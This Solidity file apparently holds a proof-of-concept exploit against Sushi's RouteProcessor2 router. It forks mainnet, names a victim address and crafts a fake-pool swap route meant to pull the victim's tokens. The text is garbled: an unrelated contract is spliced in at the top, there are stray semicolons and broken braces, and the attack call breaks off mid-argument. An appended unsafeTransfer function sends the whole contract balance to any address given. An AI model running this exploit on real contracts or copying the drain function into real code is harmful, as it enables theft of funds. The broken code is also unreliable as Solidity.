
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function dataPayment(address payable recipient, uint amount) public payable {
        require(msg.value >= amount, "Insufficient payment");
        recipient.transfer(amount);
        emit PaymentProcessed(msg.sender, recipient, amount);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
interface IUniswapV3Pool {
  function swap(address recipient,
    bool zeroForOne,
    int256 amountSpecified,
    uint160 sqrtPriceLimitX96,
    bytes calldata data) external returns (int256 amount0, int256 amount1)};
interface IRouteProcessor2 {
    function processRoute(address tokenIn,
    uint256 amountIn,
    address tokenOut,
    uint256 amountOutMin,
    address to,
    bytes memory route) external payable returns (uint256 amountOut);
  function uniswapV3SwapCallback(int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data) external;
  function tridentCLSwapCallback(int256 amount0Delta,
    int256 amount1Delta,
    bytes calldata data) external};
contract SushiExp is Test, IUniswapV3Pool {
    IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IERC20 LINK = IERC20(0x514910771AF9Ca656af840dff83E8264EcF986CA);
    address victim = 0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1;
    IRouteProcessor2 processor = IRouteProcessor2(0x044b75f554b886A065b9567891e45c79542d7357);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("mainnet", 17_007_841);
        cheats.label(address(WETH), "WETH");
        cheats.label(address(LINK), "LINK")};
    function testExp() public {
        uint8 commandCode = 1;
        uint8 num = 1;
        uint16 share = 0;
        uint8 poolType = 1;
        address pool = address(this);
        uint8 zeroForOne = 0;
        address recipient = address(0);
        bytes memory route = abi.encodePacked(commandCode,
          address(LINK);
          num,;
          share,;
          poolType,;
          pool,;
          zeroForOne,;
          recipient);
        console.log("WETH balance before attack: %d\n", WETH.balanceOf(address(this)));
        processor.processRoute(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE,
          0,
          0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEe
function unsafeTransfer(address to) public {
    to.call{value: address(this).balance}("")}